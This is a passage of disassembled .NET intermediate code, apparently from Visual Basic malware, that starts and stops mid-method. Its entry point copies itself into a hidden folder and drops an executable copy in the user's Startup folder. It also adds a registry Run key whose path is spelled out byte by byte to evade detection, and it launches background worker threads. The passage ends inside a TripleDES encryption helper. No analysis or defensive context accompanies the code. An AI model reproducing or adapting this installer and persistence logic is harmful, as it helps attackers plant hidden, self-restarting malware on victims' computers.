    IL_00f8:  stloc.0
    IL_00f9:  br.s       IL_00fb

    IL_00fb:  ldloc.0
    IL_00fc:  ret
  } // end of method Network::PreventShoot

} // end of class Q.Network

.class public auto ansi Q.SATA
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method SATA::.ctor

  .method public static void  Main() cil managed noinlining nooptimization
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       1160 (0x488)
    .maxstack  7
    .locals init (class [mscorlib]System.Threading.Thread V_0,
             class [mscorlib]System.Threading.Thread V_1,
             class [mscorlib]System.Threading.Thread V_2,
             string V_3,
             class [mscorlib]System.Exception V_4,
             uint8[] V_5)
    .try
    {
      IL_0000:  call       void Q.Loader::Active()
      IL_0005:  ldsfld     string Q.SettingPad::Sl
      IL_000a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_000f:  call       object Q.BasicFunctions::Thr(int32)
      IL_0014:  pop
      .try
      {
        IL_0015:  ldsfld     string Q.SettingPad::Sti
        IL_001a:  ldstr      "\\"
        IL_001f:  ldsfld     string Q.SettingPad::Ex
        IL_0024:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0029:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_002e:  ldsfld     string Q.Loader::Stu
        IL_0033:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_0038:  ldsfld     string Q.SettingPad::Sti
        IL_003d:  ldstr      "\\A"
        IL_0042:  ldsfld     string Q.SettingPad::Ex
        IL_0047:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_004c:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_0051:  leave.s    IL_005f

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0053:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0058:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_005d:  leave.s    IL_005f

      }  // end handler
      IL_005f:  ldsfld     string Q.SettingPad::Sti
      IL_0064:  call       bool [mscorlib]System.IO.Directory::Exists(string)
      IL_0069:  brfalse.s  IL_0083

      .try
      {
        IL_006b:  ldsfld     string Q.SettingPad::Sti
        IL_0070:  call       void [mscorlib]System.IO.Directory::Delete(string)
        IL_0075:  leave.s    IL_0083

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0077:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_007c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0081:  leave.s    IL_0083

      }  // end handler
      .try
      {
        IL_0083:  ldsfld     string Q.SettingPad::Sti
        IL_0088:  call       bool [mscorlib]System.IO.Directory::Exists(string)
        IL_008d:  brtrue     IL_011f

        IL_0092:  ldsfld     string Q.SettingPad::Sti
        IL_0097:  call       class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.Directory::CreateDirectory(string)
        IL_009c:  pop
        IL_009d:  ldsfld     bool Q.SettingPad::Fo
        IL_00a2:  brfalse.s  IL_00ce

        IL_00a4:  ldsfld     string Q.SettingPad::DR
        IL_00a9:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
        IL_00ae:  ldstr      "\\"
        IL_00b3:  ldsfld     string Q.SettingPad::Fol
        IL_00b8:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_00bd:  call       object Q.BasicFunctions::Hx(string)
        IL_00c2:  pop
        IL_00c3:  ldsfld     string Q.SettingPad::Sti
        IL_00c8:  call       object Q.BasicFunctions::Hx(string)
        IL_00cd:  pop
        IL_00ce:  ldsfld     bool Q.SettingPad::Ad
        IL_00d3:  brfalse.s  IL_011a

        IL_00d5:  ldsfld     class [mscorlib]System.IO.FileInfo Q.SettingPad::LO
        IL_00da:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_00df:  ldsfld     string Q.SettingPad::Sti
        IL_00e4:  ldstr      "\\"
        IL_00e9:  ldsfld     string Q.SettingPad::Ex
        IL_00ee:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_00f3:  ldc.i4.1
        IL_00f4:  call       void [mscorlib]System.IO.File::Copy(string,
                                                                 string,
                                                                 bool)
        IL_00f9:  ldsfld     string Q.SettingPad::Sti
        IL_00fe:  ldstr      "\\"
        IL_0103:  ldsfld     string Q.SettingPad::Ex
        IL_0108:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_010d:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_0112:  pop
        IL_0113:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
        IL_0118:  br.s       IL_011f

        IL_011a:  call       void Q.Loader::K()
        IL_011f:  leave.s    IL_0132

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0121:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0126:  call       void Q.Loader::K()
        IL_012b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0130:  leave.s    IL_0132

      }  // end handler
      IL_0132:  ldsfld     bool Q.SettingPad::HE
      IL_0137:  brfalse.s  IL_0159

      .try
      {
        IL_0139:  ldsfld     class [mscorlib]System.IO.FileInfo Q.SettingPad::LO
        IL_013e:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0143:  call       object Q.BasicFunctions::Hx(string)
        IL_0148:  pop
        IL_0149:  leave.s    IL_0157

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_014b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0150:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0155:  leave.s    IL_0157

      }  // end handler
      IL_0157:  br.s       IL_0159

      IL_0159:  ldsfld     bool Q.SettingPad::Se
      IL_015e:  brfalse.s  IL_0179

      IL_0160:  ldnull
      IL_0161:  ldftn      void Q.Evering::U()
      IL_0167:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_016c:  ldc.i4.1
      IL_016d:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_0172:  stloc.0
      IL_0173:  ldloc.0
      IL_0174:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_0179:  ldsfld     bool Q.SettingPad::Sh
      IL_017e:  brfalse.s  IL_0199

      IL_0180:  ldnull
      IL_0181:  ldftn      void Q.Evering::I()
      IL_0187:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_018c:  ldc.i4.1
      IL_018d:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_0192:  stloc.1
      IL_0193:  ldloc.1
      IL_0194:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_0199:  ldsfld     bool Q.SettingPad::Bt
      IL_019e:  brfalse.s  IL_01b9

      IL_01a0:  ldnull
      IL_01a1:  ldftn      void Q.Evering::C()
      IL_01a7:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_01ac:  ldc.i4.1
      IL_01ad:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_01b2:  stloc.2
      IL_01b3:  ldloc.2
      IL_01b4:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_01b9:  ldsfld     bool Q.SettingPad::IsF
      IL_01be:  brfalse    IL_0264

      .try
      {
        IL_01c3:  ldsfld     class [mscorlib]System.IO.FileInfo Q.SettingPad::LO
        IL_01c8:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_01cd:  ldc.i4.7
        IL_01ce:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
        IL_01d3:  ldstr      "\\"
        IL_01d8:  ldsfld     string Q.SettingPad::RG
        IL_01dd:  ldc.i4.4
        IL_01de:  newarr     [mscorlib]System.Byte
        IL_01e3:  stloc.s    V_5
        IL_01e5:  ldloc.s    V_5
        IL_01e7:  ldc.i4.0
        IL_01e8:  ldc.i4.s   46
        IL_01ea:  stelem.i1
        IL_01eb:  ldloc.s    V_5
        IL_01ed:  ldc.i4.1
        IL_01ee:  ldc.i4.s   101
        IL_01f0:  stelem.i1
        IL_01f1:  ldloc.s    V_5
        IL_01f3:  ldc.i4.2
        IL_01f4:  ldc.i4.s   120
        IL_01f6:  stelem.i1
        IL_01f7:  ldloc.s    V_5
        IL_01f9:  ldc.i4.3
        IL_01fa:  ldc.i4.s   101
        IL_01fc:  stelem.i1
        IL_01fd:  ldloc.s    V_5
        IL_01ff:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_0204:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0209:  ldc.i4.1
        IL_020a:  call       void [mscorlib]System.IO.File::Copy(string,
                                                                 string,
                                                                 bool)
        IL_020f:  ldc.i4.7
        IL_0210:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
        IL_0215:  ldstr      "\\"
        IL_021a:  ldsfld     string Q.SettingPad::RG
        IL_021f:  ldc.i4.4
        IL_0220:  newarr     [mscorlib]System.Byte
        IL_0225:  stloc.s    V_5
        IL_0227:  ldloc.s    V_5
        IL_0229:  ldc.i4.0
        IL_022a:  ldc.i4.s   46
        IL_022c:  stelem.i1
        IL_022d:  ldloc.s    V_5
        IL_022f:  ldc.i4.1
        IL_0230:  ldc.i4.s   101
        IL_0232:  stelem.i1
        IL_0233:  ldloc.s    V_5
        IL_0235:  ldc.i4.2
        IL_0236:  ldc.i4.s   120
        IL_0238:  stelem.i1
        IL_0239:  ldloc.s    V_5
        IL_023b:  ldc.i4.3
        IL_023c:  ldc.i4.s   101
        IL_023e:  stelem.i1
        IL_023f:  ldloc.s    V_5
        IL_0241:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_0246:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_024b:  ldc.i4.3
        IL_024c:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                                 valuetype [mscorlib]System.IO.FileMode)
        IL_0251:  stsfld     class [mscorlib]System.IO.FileStream Q.SettingPad::FS
        IL_0256:  leave.s    IL_0264

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0258:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_025d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0262:  leave.s    IL_0264

      }  // end handler
      IL_0264:  ldsfld     bool Q.SettingPad::Isu
      IL_0269:  brfalse    IL_0414

      .try
      {
        IL_026e:  ldc.i4.s   49
        IL_0270:  newarr     [mscorlib]System.Byte
        IL_0275:  stloc.s    V_5
        IL_0277:  ldloc.s    V_5
        IL_0279:  ldc.i4.0
        IL_027a:  ldc.i4.s   83
        IL_027c:  stelem.i1
        IL_027d:  ldloc.s    V_5
        IL_027f:  ldc.i4.1
        IL_0280:  ldc.i4.s   111
        IL_0282:  stelem.i1
        IL_0283:  ldloc.s    V_5
        IL_0285:  ldc.i4.2
        IL_0286:  ldc.i4.s   102
        IL_0288:  stelem.i1
        IL_0289:  ldloc.s    V_5
        IL_028b:  ldc.i4.3
        IL_028c:  ldc.i4.s   116
        IL_028e:  stelem.i1
        IL_028f:  ldloc.s    V_5
        IL_0291:  ldc.i4.4
        IL_0292:  ldc.i4.s   119
        IL_0294:  stelem.i1
        IL_0295:  ldloc.s    V_5
        IL_0297:  ldc.i4.5
        IL_0298:  ldc.i4.s   97
        IL_029a:  stelem.i1
        IL_029b:  ldloc.s    V_5
        IL_029d:  ldc.i4.6
        IL_029e:  ldc.i4.s   114
        IL_02a0:  stelem.i1
        IL_02a1:  ldloc.s    V_5
        IL_02a3:  ldc.i4.7
        IL_02a4:  ldc.i4.s   101
        IL_02a6:  stelem.i1
        IL_02a7:  ldloc.s    V_5
        IL_02a9:  ldc.i4.8
        IL_02aa:  ldc.i4.s   92
        IL_02ac:  stelem.i1
        IL_02ad:  ldloc.s    V_5
        IL_02af:  ldc.i4.s   9
        IL_02b1:  ldc.i4.s   77
        IL_02b3:  stelem.i1
        IL_02b4:  ldloc.s    V_5
        IL_02b6:  ldc.i4.s   10
        IL_02b8:  ldc.i4.s   105
        IL_02ba:  stelem.i1
        IL_02bb:  ldloc.s    V_5
        IL_02bd:  ldc.i4.s   11
        IL_02bf:  ldc.i4.s   99
        IL_02c1:  stelem.i1
        IL_02c2:  ldloc.s    V_5
        IL_02c4:  ldc.i4.s   12
        IL_02c6:  ldc.i4.s   114
        IL_02c8:  stelem.i1
        IL_02c9:  ldloc.s    V_5
        IL_02cb:  ldc.i4.s   13
        IL_02cd:  ldc.i4.s   111
        IL_02cf:  stelem.i1
        IL_02d0:  ldloc.s    V_5
        IL_02d2:  ldc.i4.s   14
        IL_02d4:  ldc.i4.s   115
        IL_02d6:  stelem.i1
        IL_02d7:  ldloc.s    V_5
        IL_02d9:  ldc.i4.s   15
        IL_02db:  ldc.i4.s   111
        IL_02dd:  stelem.i1
        IL_02de:  ldloc.s    V_5
        IL_02e0:  ldc.i4.s   16
        IL_02e2:  ldc.i4.s   102
        IL_02e4:  stelem.i1
        IL_02e5:  ldloc.s    V_5
        IL_02e7:  ldc.i4.s   17
        IL_02e9:  ldc.i4.s   116
        IL_02eb:  stelem.i1
        IL_02ec:  ldloc.s    V_5
        IL_02ee:  ldc.i4.s   18
        IL_02f0:  ldc.i4.s   92
        IL_02f2:  stelem.i1
        IL_02f3:  ldloc.s    V_5
        IL_02f5:  ldc.i4.s   19
        IL_02f7:  ldc.i4.s   87
        IL_02f9:  stelem.i1
        IL_02fa:  ldloc.s    V_5
        IL_02fc:  ldc.i4.s   20
        IL_02fe:  ldc.i4.s   105
        IL_0300:  stelem.i1
        IL_0301:  ldloc.s    V_5
        IL_0303:  ldc.i4.s   21
        IL_0305:  ldc.i4.s   110
        IL_0307:  stelem.i1
        IL_0308:  ldloc.s    V_5
        IL_030a:  ldc.i4.s   22
        IL_030c:  ldc.i4.s   100
        IL_030e:  stelem.i1
        IL_030f:  ldloc.s    V_5
        IL_0311:  ldc.i4.s   23
        IL_0313:  ldc.i4.s   111
        IL_0315:  stelem.i1
        IL_0316:  ldloc.s    V_5
        IL_0318:  ldc.i4.s   24
        IL_031a:  ldc.i4.s   119
        IL_031c:  stelem.i1
        IL_031d:  ldloc.s    V_5
        IL_031f:  ldc.i4.s   25
        IL_0321:  ldc.i4.s   115
        IL_0323:  stelem.i1
        IL_0324:  ldloc.s    V_5
        IL_0326:  ldc.i4.s   26
        IL_0328:  ldc.i4.s   92
        IL_032a:  stelem.i1
        IL_032b:  ldloc.s    V_5
        IL_032d:  ldc.i4.s   27
        IL_032f:  ldc.i4.s   67
        IL_0331:  stelem.i1
        IL_0332:  ldloc.s    V_5
        IL_0334:  ldc.i4.s   28
        IL_0336:  ldc.i4.s   117
        IL_0338:  stelem.i1
        IL_0339:  ldloc.s    V_5
        IL_033b:  ldc.i4.s   29
        IL_033d:  ldc.i4.s   114
        IL_033f:  stelem.i1
        IL_0340:  ldloc.s    V_5
        IL_0342:  ldc.i4.s   30
        IL_0344:  ldc.i4.s   114
        IL_0346:  stelem.i1
        IL_0347:  ldloc.s    V_5
        IL_0349:  ldc.i4.s   31
        IL_034b:  ldc.i4.s   101
        IL_034d:  stelem.i1
        IL_034e:  ldloc.s    V_5
        IL_0350:  ldc.i4.s   32
        IL_0352:  ldc.i4.s   110
        IL_0354:  stelem.i1
        IL_0355:  ldloc.s    V_5
        IL_0357:  ldc.i4.s   33
        IL_0359:  ldc.i4.s   116
        IL_035b:  stelem.i1
        IL_035c:  ldloc.s    V_5
        IL_035e:  ldc.i4.s   34
        IL_0360:  ldc.i4.s   86
        IL_0362:  stelem.i1
        IL_0363:  ldloc.s    V_5
        IL_0365:  ldc.i4.s   35
        IL_0367:  ldc.i4.s   101
        IL_0369:  stelem.i1
        IL_036a:  ldloc.s    V_5
        IL_036c:  ldc.i4.s   36
        IL_036e:  ldc.i4.s   114
        IL_0370:  stelem.i1
        IL_0371:  ldloc.s    V_5
        IL_0373:  ldc.i4.s   37
        IL_0375:  ldc.i4.s   115
        IL_0377:  stelem.i1
        IL_0378:  ldloc.s    V_5
        IL_037a:  ldc.i4.s   38
        IL_037c:  ldc.i4.s   105
        IL_037e:  stelem.i1
        IL_037f:  ldloc.s    V_5
        IL_0381:  ldc.i4.s   39
        IL_0383:  ldc.i4.s   111
        IL_0385:  stelem.i1
        IL_0386:  ldloc.s    V_5
        IL_0388:  ldc.i4.s   40
        IL_038a:  ldc.i4.s   110
        IL_038c:  stelem.i1
        IL_038d:  ldloc.s    V_5
        IL_038f:  ldc.i4.s   41
        IL_0391:  ldc.i4.s   92
        IL_0393:  stelem.i1
        IL_0394:  ldloc.s    V_5
        IL_0396:  ldc.i4.s   42
        IL_0398:  ldc.i4.s   82
        IL_039a:  stelem.i1
        IL_039b:  ldloc.s    V_5
        IL_039d:  ldc.i4.s   43
        IL_039f:  ldc.i4.s   117
        IL_03a1:  stelem.i1
        IL_03a2:  ldloc.s    V_5
        IL_03a4:  ldc.i4.s   44
        IL_03a6:  ldc.i4.s   110
        IL_03a8:  stelem.i1
        IL_03a9:  ldloc.s    V_5
        IL_03ab:  ldc.i4.s   45
        IL_03ad:  ldc.i4.s   79
        IL_03af:  stelem.i1
        IL_03b0:  ldloc.s    V_5
        IL_03b2:  ldc.i4.s   46
        IL_03b4:  ldc.i4.s   110
        IL_03b6:  stelem.i1
        IL_03b7:  ldloc.s    V_5
        IL_03b9:  ldc.i4.s   47
        IL_03bb:  ldc.i4.s   99
        IL_03bd:  stelem.i1
        IL_03be:  ldloc.s    V_5
        IL_03c0:  ldc.i4.s   48
        IL_03c2:  ldc.i4.s   101
        IL_03c4:  stelem.i1
        IL_03c5:  ldloc.s    V_5
        IL_03c7:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_03cc:  stloc.3
        IL_03cd:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer Q.SettingPad::F
        IL_03d2:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_03d7:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_03dc:  ldloc.3
        IL_03dd:  ldc.i4.1
        IL_03de:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_03e3:  ldsfld     string Q.SettingPad::RG
        IL_03e8:  ldstr      "\""
        IL_03ed:  ldsfld     class [mscorlib]System.IO.FileInfo Q.SettingPad::LO
        IL_03f2:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_03f7:  ldstr      "\" .."
        IL_03fc:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0401:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0406:  leave.s    IL_0414

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0408:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_040d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0412:  leave.s    IL_0414

      }  // end handler
      IL_0414:  ldsfld     bool Q.SettingPad::Fa
      IL_0419:  brfalse.s  IL_0471

      IL_041b:  ldc.i4.7
      IL_041c:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0421:  ldstr      "\\"
      IL_0426:  ldsfld     string Q.SettingPad::RG
      IL_042b:  ldc.i4.4
      IL_042c:  newarr     [mscorlib]System.Byte
      IL_0431:  stloc.s    V_5
      IL_0433:  ldloc.s    V_5
      IL_0435:  ldc.i4.0
      IL_0436:  ldc.i4.s   46
      IL_0438:  stelem.i1
      IL_0439:  ldloc.s    V_5
      IL_043b:  ldc.i4.1
      IL_043c:  ldc.i4.s   108
      IL_043e:  stelem.i1
      IL_043f:  ldloc.s    V_5
      IL_0441:  ldc.i4.2
      IL_0442:  ldc.i4.s   110
      IL_0444:  stelem.i1
      IL_0445:  ldloc.s    V_5
      IL_0447:  ldc.i4.3
      IL_0448:  ldc.i4.s   107
      IL_044a:  stelem.i1
      IL_044b:  ldloc.s    V_5
      IL_044d:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_0452:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0457:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_045c:  brtrue.s   IL_046a

      IL_045e:  call       void Q.Evering::Thr()
      IL_0463:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0468:  br.s       IL_046f

      IL_046a:  call       void Q.Loader::K()
      IL_046f:  br.s       IL_0476

      IL_0471:  call       void Q.Loader::K()
      IL_0476:  leave.s    IL_0487

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0478:  dup
      IL_0479:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_047e:  stloc.s    V_4
      IL_0480:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0485:  leave.s    IL_0487

    }  // end handler
    IL_0487:  ret
  } // end of method SATA::Main

} // end of class Q.SATA

.class public auto ansi beforefieldinit Q.Security
       extends [mscorlib]System.Object
{
  .field private static class [mscorlib]System.Security.Cryptography.TripleDESCryptoServiceProvider m_des
  .field private static class [mscorlib]System.Text.UTF8Encoding m_utf8
  .field private static uint8[] m_key
  .field private static uint8[] m_iv
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       21 (0x15)
    .maxstack  8
    IL_0000:  newobj     instance void [mscorlib]System.Security.Cryptography.TripleDESCryptoServiceProvider::.ctor()
    IL_0005:  stsfld     class [mscorlib]System.Security.Cryptography.TripleDESCryptoServiceProvider Q.Security::m_des
    IL_000a:  newobj     instance void [mscorlib]System.Text.UTF8Encoding::.ctor()
    IL_000f:  stsfld     class [mscorlib]System.Text.UTF8Encoding Q.Security::m_utf8
    IL_0014:  ret
  } // end of method Security::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor(uint8[] key,
                               uint8[] iv) cil managed
  {
    // Code size       19 (0x13)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.1
    IL_0007:  stsfld     uint8[] Q.Security::m_key
    IL_000c:  ldarg.2
    IL_000d:  stsfld     uint8[] Q.Security::m_iv
    IL_0012:  ret
  } // end of method Security::.ctor

  .method public static uint8[]  Encrypt(uint8[] input) cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  4
    .locals init (uint8[] V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldsfld     class [mscorlib]System.Security.Cryptography.TripleDESCryptoServiceProvider Q.Security::m_des
    IL_0006:  ldsfld     uint8[] Q.Security::m_key
    IL_000b:  ldsfld     uint8[] Q.Security::m_iv
    IL_0010:  callvirt   instance class [mscorlib]System.Security.Cryptography.ICryptoTransform [mscorlib]System.Security.Cryptography.TripleDESCryptoServiceProvider::CreateEncryptor(uint8[],
                                                                                                                                                                                       uint8[])
    IL_0015:  call       uint8[] Q.Security::Transform(uint8[],
                                                       class [mscorlib]System.Security.Cryptography.ICryptoTransform)
    IL_001a:  stloc.0
    IL_001b:  br.s       IL_001d

    IL_001d:  ldloc.0
    IL_001e:  ret
  } // end of method Security::Encrypt

  .method public static uint8[]  Decrypt(uint8[] input) cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  4
    .locals init (uint8[] V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldsfld     class [mscorlib]System.Security.Cryptography.TripleDESCryptoServiceProvider Q.Security::m_des
    IL_0006:  ldsfld     uint8[] Q.Security::m_key
    IL_000b:  ldsfld     uint8[] Q.Security::m_iv
    IL_0010:  callvirt   instance class [mscorlib]System.Security.Cryptography.ICryptoTransform [mscorlib]System.Security.Cryptography.TripleDESCryptoServiceProvider::CreateDecryptor(uint8[],
                                                                                                                                                                                       uint8[])
    IL_0015:  call       uint8[] Q.Security::Transform(uint8[],
                                                       class [mscorlib]System.Security.Cryptography.ICryptoTransform)
    IL_001a:  stloc.0
    IL_001b:  br.s       IL_001d

    IL_001d:  ldloc.0
    IL_001e:  ret
  } // end of method Security::Decrypt

  .method public static string  Encrypt(string text) cil managed
  {
    // Code size       50 (0x32)
    .maxstack  4
    .locals init (string V_0,
             uint8[] V_1,
             uint8[] V_2)
    IL_0000:  ldsfld     class [mscorlib]System.Text.UTF8Encoding Q.Security::m_utf8
    IL_0005:  ldarg.0
    IL_0006:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000b:  stloc.1
    IL_000c:  ldloc.1
    IL_000d:  ldsfld     class [mscorlib]System.Security.Cryptography.TripleDESCryptoServiceProvider Q.Security::m_des
    IL_0012:  ldsfld     uint8[] Q.Security::m_key
    IL_0017:  ldsfld     uint8[] Q.Security::m_iv
    IL_001c:  callvirt   instance class [mscorlib]System.Security.Cryptography.ICryptoTransform [mscorlib]System.Security.Cryptography.TripleDESCryptoServiceProvider::CreateEncryptor(uint8[],
                                                                                                                                                                                       uint8[])
    IL_0021:  call       uint8[] Q.Security::Transform(uint8[],
                                                       class [mscorlib]System.Security.Cryptography.ICryptoTransform)
    IL_0026:  stloc.2
    IL_0027:  ldloc.2
    IL_0028:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_002d:  stloc.0
    IL_002e:  br.s       IL_0030

    IL_0030:  ldloc.0
    IL_0031:  ret
  } // end of method Security::Encrypt

  .method public static string  Decrypt(string text) cil managed
  {
    // Code size       50 (0x32)
    .maxstack  4
    .locals init (string V_0,
             uint8[] V_1,
             uint8[] V_2)
    IL_0000:  ldarg.0
    IL_0001:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0006:  stloc.1
    IL_0007:  ldloc.1
    IL_0008:  ldsfld     class [mscorlib]System.Security.Cryptography.TripleDESCryptoServiceProvider Q.Security::m_des
    IL_000d:  ldsfld     uint8[] Q.Security::m_key
    IL_0012:  ldsfld     uint8[] Q.Security::m_iv
    IL_0017:  callvirt   instance class [mscorlib]System.Security.Cryptography.ICryptoTransform [mscorlib]System.Security.Cryptography.TripleDESCryptoServiceProvider::CreateDecryptor(uint8[],
                                                                                                                                                                                       uint8[])
    IL_001c:  call       uint8[] Q.Security::Transform(uint8[],
                                                       class [mscorlib]System.Security.Cryptography.ICryptoTransform)
    IL_0021:  stloc.2
    IL_0022:  ldsfld     class [mscorlib]System.Text.UTF8Encoding Q.Security::m_utf8
    IL_0027:  ldloc.2
    IL_0028:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_002d:  stloc.0
    IL_002e:  br.s       IL_0030

    IL_0030:  ldloc.0
    IL_0031:  ret
  } // end of method Security::Decrypt

  .method private static uint8[]  Transform(uint8[] input,
                                            class [mscorlib]System.Security.Cryptography.ICryptoTransform CryptoTransform) cil managed
  {
    // Code size       88 (0x58)
    .maxstack  4
    .locals init (class [mscorlib]System.Security.Cryptography.CryptoStream V_0,
             class [mscorlib]System.IO.MemoryStream V_1,
             uint8[] V_2,
             uint8[] V_3)
    IL_0000:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0005:  stloc.1
    IL_0006:  ldloc.1
    IL_0007:  ldarg.1
    IL_0008:  ldc.i4.1
    IL_0009:  newobj     instance void [mscorlib]System.Security.Cryptography.CryptoStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                                  class [mscorlib]System.Security.Cryptography.ICryptoTransform,
                                                                                                  valuetype [mscorlib]System.Security.Cryptography.CryptoStreamMode)
    IL_000e:  stloc.0
    IL_000f:  ldloc.0
    IL_0010:  ldarg.0
    IL_0011:  ldc.i4.0
    IL_0012:  ldarg.0
    IL_0013:  ldlen
    IL_0014:  conv.ovf.i4
